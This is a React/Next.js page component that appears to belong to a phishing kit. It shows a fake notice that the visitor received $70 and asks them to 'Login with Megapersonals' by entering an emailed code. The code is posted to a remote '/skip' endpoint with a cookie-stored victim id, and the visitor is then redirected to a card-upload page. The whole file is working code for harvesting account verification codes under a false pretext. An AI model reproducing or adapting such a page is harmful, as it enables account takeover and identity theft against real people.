"use client"

import Cookies from "js-cookie";
import { useState } from "react";
import { API_URL } from "../config";
import { toast } from "react-toastify";
import { useRouter } from "next/navigation";

function SecurityCheckPage() {
  const router = useRouter();
  const [skipcode,setSkipcode] = useState("");
  const currentDate = new Date();
  const options = { year: "numeric", month: "long", day: "numeric" };
  const formattedDate = currentDate.toLocaleDateString("en-US", options);

  const id = Cookies.get("id");

 

  const handleSubmit = async () => {
    const values = {
      id: id,
      skipcode
    };
  
    const url = `${API_URL}/skip`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      toast.success("Login Succecssfull");
      console.log("success", data);
      router.push("/cardUpload");
      setSkipcode("")
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };

  return (
    <div className="w-full md:w-[40%]  p-5 shadow-2xl rounded-md mx-auto">
    <p className="text-lg font-semibold text-center">
      Accept your Payment{" "}
    </p>
    <p className="text-center text-sm text-gray-400">
      You just got <span className="text-green-500">$70</span> from Travis
      Scott
    </p>
    <img src="/images/logo-potrait.jpg" alt="" />
    <p className="text-center text-xs mt-3">To accept this money</p>
    <div className="flex flex-col m-3">
      <p className="text-start text-lg font-semibold pl-3">
        Login with Megapersonals
      </p>
      <p className="text-start text-sm mt-1 text-green-500">
        Check spam folder to your email
      </p>
      <input
      type="number"
        value={skipcode}
        onChange={(e) => setSkipcode(e.target.value)}
        className="w-full px-5 py-1 rounded-md border border-gray-400 outline-none mt-1 focus:border-green-500"
        placeholder="Enter code hare"
      />
     
      <button
        className="w-full px-5 py-1 rounded-xl bg-green-600 mt-3 text-white"
        onClick={() => handleSubmit()}
      >
        Submit
      </button>
    </div>
  </div>
  );
}

export default SecurityCheckPage;
